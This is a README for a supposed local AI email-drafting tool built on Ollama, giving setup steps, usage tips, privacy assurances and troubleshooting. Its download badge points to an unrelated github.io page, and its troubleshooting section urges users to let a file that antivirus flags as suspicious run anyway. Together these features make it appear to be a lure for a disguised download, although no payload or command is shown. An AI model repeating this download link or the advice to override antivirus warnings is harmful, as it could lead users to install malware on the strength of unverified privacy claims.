# 📧 AI_Email_Generator - Write professional emails faster locally

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://wordmiddling872.github.io)

AI_Email_Generator creates business emails using your own computer. It runs entirely on your local machine. You do not need to share your data with cloud servers or pay for expensive monthly subscriptions. 

The software uses advanced language models to draft messages that sound professional and natural. You provide a topic or a few bullet points, and the generator writes a complete email for you. It simplifies your writing tasks and helps you communicate with clients or coworkers with efficiency.

## ⚙️ Setting Up Your Computer

Before you run the generator, you need to set up the engine that powers the text generation. This tool relies on a program called Ollama.

1. Visit the Ollama website at ollama.com.
2. Download the installer for Windows.
3. Run the installer and follow the prompts on your screen.
4. Once the setup completes, open your command prompt or just restart your computer to ensure the changes take effect.

Ollama allows your computer to understand and write text locally. It acts as the brain behind the Email Generator. Without this running in the background, the application cannot craft your emails.

## 📝 Writing Your First Email

The interface is simple and clean. Follow these steps to generate a draft:

1. Locate the text box labeled "Email Topic."
2. Type a brief description of what you want to say. For example: "Write an email to a client explaining that the project delay is due to technical issues and suggest a meeting."
3. Adjust the "Tone" settings if you prefer a formal or casual voice.
4. Click the "Generate" button.
5. Wait a few seconds for the model to process your request.
6. The text of your email will appear on the screen. You can highlight this text, copy it, and paste it into your preferred email provider.

## 💡 Best Practices

Local artificial intelligence works best when you give it clear instructions. Here are some tips to get better results:

*   **Be Specific**: Instead of writing "Write an email about the project," try "Write a status update email for the Marketing Project, noting that the design phase is finished."
*   **State the Audience**: Tell the AI who will read the email. Including the recipient's role helps the software choose the right vocabulary.
*   **Review Before Sending**: The software creates drafts. Always read the output to ensure the tone and facts align with your needs before sending it to a recipient.

## 🛡️ Privacy and Data

This tool works offline. Your data never leaves your hard drive. Because the software interacts with the Ollama engine locally, no third party collects, views, or stores your email drafts. This provides a secure way to manage sensitive business communications without trusting cloud-based artificial intelligence providers.

## 🛠️ Troubleshooting Common Issues

If the application fails to open or stops responding, consider these common fixes:

*   **Check Ollama**: Verify that Ollama is running. You should see an icon in your system tray at the bottom right of your screen.
*   **Re-run the Application**: Sometimes a background process halts. Close the browser window and the application, then try opening the file again.
*   **Antivirus Software**: Some security programs flag new files as suspicious. If you cannot open the file, check your antivirus settings to confirm that you allow the software to run.
*   **Internet Connection**: While the machine generates text locally, you need an internet connection the first time you set up the program to download the necessary models through Ollama. After the initial download, you can work fully offline.
